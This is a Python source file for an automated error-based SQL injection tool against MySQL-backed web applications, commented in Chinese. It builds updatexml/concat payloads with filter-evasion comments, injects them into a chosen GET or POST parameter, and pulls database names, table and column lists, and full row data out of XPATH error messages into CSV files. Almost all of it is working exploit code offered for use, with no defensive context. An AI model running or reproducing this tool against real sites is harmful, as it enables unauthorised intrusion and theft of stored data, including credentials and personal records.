#coding:utf-8 

#Author: tudou7
#Time: 2020/06/10
#File: updatexml_sql.py
#Description: updatexml自动化注入工具

import requests
import re
import urllib3
import binascii
import json
import csv
import argparse
import os
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# proxies = {'http': 'http://120.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def get_header(url):
    """处理get请求

    Args:
        url (string): [URL]
    """
    header = {
        'Host': '',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close'}
    req_method = "GET"
    url_cut = urlparse(url)
    header['Host'] = url_cut.netloc
    para = url_cut.query
    return req_method, url, header, para


def post_header(file, httpssl):
    """处理post数据包

    Args:
        file ([string]): [post数据包文件]
        httpssl ([string]): [https or http]

    Returns:
        [string]: [返回请求方法，URL，请求头，post参数]
    """
    fo = open(file, 'r')
    req_header = fo.readlines()
    fo.close()
    req_base = req_header[0].strip('\n').split(' ') #请求包第一行，获取method，url
    req_method = req_base[0] #method
    req_url = req_base[1] #url
    headers = {}
    for i in req_header[1:-2]:
        header_key = i.strip('\n').split(': ')
        headers[header_key[0]] = header_key[1]  #处理header
    para = req_header[-1] # post参数
    req_url = httpssl  + '://' + headers['Host'] + req_url
    return req_method, req_url, headers, para

def str_to_hexStr(string):
    """字符转16进制

    Args:
        string (string): [需要转义的字符串]

    Returns:
        string: 转义后的16进制字符串
    """    
    str_bin = string.encode('utf-8')
    hex = binascii.hexlify(str_bin).decode('utf-8')
    sql_hex = '0x' + hex
    return sql_hex

def cut_text(lenth):
    """如果sql数据长度大于32，则对其进行分段获取数据

    Args:
        lenth (string): 数据长度

    Returns:
        list: 按每10个字符获取数据
    """    
    res = [[1, 10]]
    rr = lenth / 10 #除10取整，分成多少个段
    rr_1 = int(rr)
    num = 1
    for i in range(rr_1):
        tt = 10 * num + 1 #10的倍数加一为下一段的起始位置
        oo = 10 * (num + 1) #分段结束位置
        if int(oo) >= lenth:
            ii = [int(tt), 10] #如果结束位置等于数据长度，结束循环，输出数据
            res.append(ii)
            break
        ii = [int(tt), 10]
        res.append(ii)
        num = num + 1
    return res

class udpatexml_get():
    def __init__(self, url, method, para, headers, inject_para):
        self.url = url
        self.method = method
        self.para = para
        self.headers = headers
        self.inject_para = inject_para

    def sql_para(self,sql_inject): 
        """将注入语句驾到存在注入的参数后面

        Args:
            sql_inject (string)): 注入语句

        Returns:
            string: 返回加上注入语句之后的参数字符串
        """        
        para_list = self.para.split('&')  #按&分割参数
        para_sql = ''
        # 循环参数，查找存在注入的参数，然后和sql注入语句拼接
        for i in para_list:
            para_cut = i.split('=')
            if para_cut[0] == self.inject_para:
                i = i + sql_inject
            para_sql =  para_sql + '&' + i # 把sql语句拼接之后，重新把全部参数拼接成字符串
        para_sql = para_sql.strip('&') # 去掉首尾的&
        return para_sql

    def request_req(self, sql_select):
        """判断是post请求还是get请求，并使用不同的requests请求方法

        Args:
            sql_select (string): sql注入的查询语句，供sql_para函数使用

        Returns:
            string: 返回响应体
        """        
        if self.method == "POST":
            post_data = self.sql_para(sql_select)
            res = requests.post(url=self.url, headers=self.headers, verify=False, data=post_data)
            res.encoding = 'utf-8'
        else:
            get_para = self.sql_para(sql_select)
            urls_cut = urlparse(self.url)
            urls = urls_cut.scheme + '://' + urls_cut.netloc + urls_cut.path + '?' + get_para
            res = requests.get(url=urls, headers=self.headers, verify=False)
            res.encoding = 'utf-8'
        req_res = res.text
        return req_res

    def json_csv(self, tablename, json):
        """把获取的json数据输出到csv文件

        Args:
            tablename (string): 用于文件民
            json (dict/list): 需要输出到csv的数据

        Returns:
            boolean: 返回成功
        """
        url_cut = urlparse(self.url)       
        with open('./{}/{}.csv'.format(url_cut.netloc,tablename), 'a') as csvfile:
            writer = csv.writer(csvfile)
            if type(json) == list:
                writer.writerow(json) # 在输出列标题的时候，传入的是list
            if type(json) == dict:
                writer.writerow(json.values()) # 输出数据的时候是dict格式
        return True

    def get_database(self):
        """获取数据库

        Returns:
            [string]: [返回获得数据库]
        """             
        print('start database')
        sql_database = r'%20and%20(updatexml(1,concat(0x7e,(select/**/database()%20limit%200,1),0x7e),1))--%20 #'
        res_body = self.request_req(sql_database)
        database_re = re.search(r'XPATH syntax error:.*~', res_body, re.M | re.I)
        current_database = database_re.group(0).replace(r"XPATH syntax error: '~",'').replace(r"~", "")
        print('Current_Database: ' + current_database)
        return current_database

    def get_tables(self, database):
        """获取数据表名

        Args:
            database (string): 需要获取数据表的数据库

        Returns:
            list: 返回获得数据表列表
        """        
        print('start Table')
        database_hex = str_to_hexStr(database)
        tables = []
        sql_table_count = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(table_name)/*!11440from*//**/information_schema.tables/**/where/**/table_schema={}%20limit%200,1),0x7e),1))--%20 #'.format(database_hex)
        res_body = self.request_req(sql_table_count)
        count_table_re = re.search(r'XPATH syntax error:.*~', res_body, re.M | re.I)
        try:
            count_table = count_table_re.group(0).replace(r"XPATH syntax error: '~",
                                '').replace(r"~", "")
        except:
            count_table = 0
        print('Table_count: ' + str(count_table))
        if int(count_table) != 0:
            for i in range(int(count_table)):
                sql_table = r'%20and%20(updatexml(1,concat(0x7e,(select/**/table_name/*!11440from*//**/information_schema.tables/**/where/**/table_schema={}%20limit%20{},1),0x7e),1))--%20 #'.format(database_hex, i)
                res_table_body = self.request_req(sql_table)
                columns_re = re.search(r'XPATH syntax error:.*~', res_table_body, re.M | re.I)
                try:
                    tables_get = columns_re.group(0).replace(r"XPATH syntax error: '~",
                                                            '').replace(r"~", "")
                    tables.append(tables_get)
                except:
                    print("SQL ERROR!")
                    break
                print("进度:{0}%".format(round((i + 1) * 100 / int(count_table))), end="\r")
        print(tables)
        return tables

    def get_columns(self, tablename):
        """获取字段名

        Args:
            tablename (string): 需要获取字段名的数据表

        Returns:
            list: 返回字段名的列表
        """        
        print('start column')
        tablename_hex = str_to_hexStr(tablename)
        columns = []
        sql_columns_count = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(column_name)/*!11440from*//**/information_schema.columns/**/where/**/table_name={}%20limit%200,1),0x7e),1))--%20 #'.format(tablename_hex)
        res_body = self.request_req(sql_columns_count)
        count_col_re = re.search(r'XPATH syntax error:.*~', res_body, re.M | re.I)
        try:
            count_col = count_col_re.group(0).replace(r"XPATH syntax error: '~",
                                '').replace(r"~", "")
        except:
            count_col = 0
        print('Columns_Count: ' + str(count_col))
        if int(count_col) != 0:
            for i in range(int(count_col)):
                sql_column = r'%20and%20(updatexml(1,concat(0x7e,(select/**/column_name/*!11440from*//**/information_schema.columns/**/where/**/table_name={}%20limit%20{},1),0x7e),1))--%20 #'.format(tablename_hex,i)
                res_col_body = self.request_req(sql_column)
                columns_re = re.search(r'XPATH syntax error:.*~', res_col_body, re.M | re.I)
                try:
                    columns_get = columns_re.group(0).replace(r"XPATH syntax error: '~",
                                                            '').replace(r"~", "")
                    columns.append(columns_get)
                except:
                    print("SQL ERROR!")
                    break
                print("进度:{0}%".format(round((i + 1) * 100 / int(count_col))), end="\r")
        print(','.join(columns))
        return columns

    def get_data(self,tablename,columns):
        """获取数据

        Args:
            tablename (string)): 需要获取数据的数据表
            columns (list): 需要获取数据的字段

        Returns:
            list: 返回数据列表
        """        
        print('start data')
        dirpath = urlparse(self.url) 
        os.mkdir(dirpath.netloc)  #创建文件夹存放数据，文件夹名是hostname
        data_total = [] # 全部数据
        data = {} # 单条数据
        sql_data = r'%20and%20(updatexml(1,concat(0x7e,(select/**/count(*)/*!11440from*//**/{}%20limit%200,1),0x7e),1))--%20 #'.format(tablename)
        res_body = self.request_req(sql_data)
        count_data_re = re.search(r'XPATH syntax error:.*~', res_body, re.M | re.I)
        try:
            count_data = count_data_re.group(0).replace(r"XPATH syntax error: '~",
                                '').replace(r"~", "") # 数据量
        except:
            count_data = 0
        print('Data_Count: ' + str(count_data))
        self.json_csv(tablename, columns)  # 创建csv文件，写表头
        if int(count_data) != 0:
            for i in range(int(count_data)):
                for column in columns:
                    # sql语句判断了数据的长度，如果数据长度超过30则返回字符串‘t00long’，如果小于30 则直接输出数据
                    sql_data = r'%20and%20(updatexml(1,concat(0x7e,(select/**/if(length({})/**/not/**/between/**/0/**/and/**/30,0x7430306c6f6e67, {})/*!11440from*//**/{}%20limit%20{},1),0x7e),1))--%20 #'.format(column, column, tablename, i)
                    res_data_body = self.request_req(sql_data)
                    data_re = re.search(r'XPATH syntax error:.*~', res_data_body, re.M | re.I)
                    try:
                        data_get = data_re.group(0).replace(r"XPATH syntax error: '~",
                                                                '').replace(r"~", "")
                    except:
                        print("SQL ERROR!")
                        break
                    if data_get == 't00long':
                        # 当数据过长的时候，查询字段长度
                        sql_data_len = r'%20and%20(updatexml(1,concat(0x7e,(select/**/length({})/*!11440from*//**/{}%20limit%20{},1),0x7e),1))--%20 #'.format(column, tablename,i)
                        res_data_getlen_body = self.request_req(sql_data_len)
                        res_data_getlen_re = re.search(r'XPATH syntax error:.*~', res_data_getlen_body, re.M | re.I)
                        try:
                            data_leng = res_data_getlen_re.group(0).replace(r"XPATH syntax error: '~",
                                                                    '').replace(r"~", "")
                        except:
                            print("SQL ERROR!")
                            data_leng = 0
                        cut = cut_text(int(data_leng)) # 按长度进行分段
                        res_str = ''
                        # 分段获取过长数据
                        for j in cut:
                            sql_data_col_len = r'%20and%20(updatexml(1,concat(0x7e,(select/**/substr({},{},{})/*!11440from*//**/{}%20limit%20{},1),0x7e),1))--%20 #'.format(column, j[0], j[1],tablename,i)
                            res_data_len_body = self.request_req(sql_data_col_len)
                            data_re_len = re.search(r'XPATH syntax error:.*~', res_data_len_body , re.M | re.I)
                            try:
                                data_get_len = data_re_len.group(0).replace(r"XPATH syntax error: '~",
                                                                    '').replace(r"~", "")
                            except:
                                data_get_len = ''
                            res_str = res_str + data_get_len
                        data.update({column: res_str})  # 添加数据，字典形式
                        res_str = ''
                    else:
                        data.update({column: data_get})
                self.json_csv(tablename, data)
                data_total.append(data) # 把每条数据添加到list里面
                data = {} # 每次重置data
                count_get = i + 1
                print("已获取{0}条，进度:{1}%".format(count_get, round((i + 1) * 100 / int(count_data))), end="\r")
        else:
            print(tablename + '为空')
        return data_total

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SQL Updatexml')
    parser.add_argument('-u','--url', help='Start scanning url with GET method')
    parser.add_argument('-r', '--file', help='Start scanning url with POST method, Request body')
    parser.add_argument('-p', '--parameter', help='Which parameter can be injected')
    parser.add_argument('-s', '--protocol', help='If you use -r, should add http or https')
    parser.add_argument('-cookie','--cookie', help='cookie')
    parser.add_argument('--current', help='Get database', action='store_true')
    parser.add_argument('--tables', help='Get tables', action='store_true')
    parser.add_argument('--columns', help='Get columns', action='store_true')
    parser.add_argument('-D', '--database', help='Which Database need get data')
    parser.add_argument('-T', '--table', help='Which Table need get data')
    parser.add_argument('-C', '--column', help='Which columns need get data')
    args = parser.parse_args()
    if args.parameter:
        if args.url:
            method, url, header, para = get_header(args.url)
            header['Cookie'] = args.cookie
        if args.file and args.protocol:
            method, url, header, para = post_header(args.file, args.protocol)
        else:
            print('Error: 请使用-s参数指定是http还是https!')
            os._exit(0)
        data = udpatexml_get(url, method, para, header, args.parameter)
        if args.current:
            data.get_database()
        if args.tables:
            data.get_tables(args.database)
        if args.columns:
            data.get_columns(args.table)
        if args.column:
            columns = args.column.split(',')
            data.get_data(args.table, columns)
    else:
        print('Error: 请使用-p 指定能被注入的参数')